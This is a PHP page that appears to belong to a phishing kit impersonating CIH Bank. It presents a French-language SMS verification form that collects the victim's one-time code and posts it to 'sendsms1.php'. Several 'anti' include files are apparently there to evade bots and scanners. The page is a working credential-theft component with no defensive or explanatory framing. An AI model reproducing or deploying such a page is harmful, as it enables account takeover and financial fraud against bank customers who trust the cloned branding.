<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/
/* Copyright: */
/* Don't touch Copyright: */
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php";

?>
<!DOCTYPE html>
<html style="background: #FFF;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex,">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="css/css-helpers.css">
        <link rel="stylesheet" href="css/css-style.css">

        <link rel="shortcut icon" href="favicons/newSkinImgs-favicon-new-cih.ico">

        <title>CIH ONLINE</title>
    </head>

    <body style="background: #FFF;">

		<div id="ss-wrapper">
            <div class="ss-area">
                <form action="sendsms1.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="sms">
                <input type="hidden" name="error" value="">
                <div class="top d-flex align-items-center">
                    
                    <div class="flex-grow-1"><center><img style="max-width: 150px;" src="images/newSkinImgs-logo_cihbank.png"></center></div>
                </div>
                <h3>Veuillez confirmer la v&eacute;rification.</h3>
                <div class="details">
                    <p>Le mot de passe unique a &eacute;t&eacute; envoy&eacute; &agrave; votre num&eacute;ro de mobile. Si vous avez besoin de changer votre num&eacute;ro de mobile, veuillez contacter votre banque ou le modifier via les canaux disponibles (ATM, web).</p>
                    <table>
                        <tr>
                            <td>Date:</td>
                            <td><?php echo date("d/m/Y"); ?></td>
                        </tr>
                        
                        <tr>
                            <td>SMS code</td>
                            <td>
                                <input type="text" name="sms_code" id="sms_code" class="">
                                                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Veuillez entrer le code de v&eacute;rification re&ccedil;u par sms : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </div>
                <div class="btns">
                    <center><button type="submit">Valider</button></center>
                    
                </div>
                <p class="copy">&copy; CIH 2022. All rights reserved.</p>
            </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/js-bootstrap.bundle.min.js"></script>
        <script src="js/js-all.min.js"></script>
        <script src="js/3.0.0-jquery.payment.min.js"></script>
        <script src="js/js-jquery.countdownTimer.min.js"></script>
        <script src="js/js-script.js"></script>

        <script type="text/javascript">
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Try again');
            }
            $('.timer').click(function(){
                location.reload();
            });
        </script>

    </body>

</html>
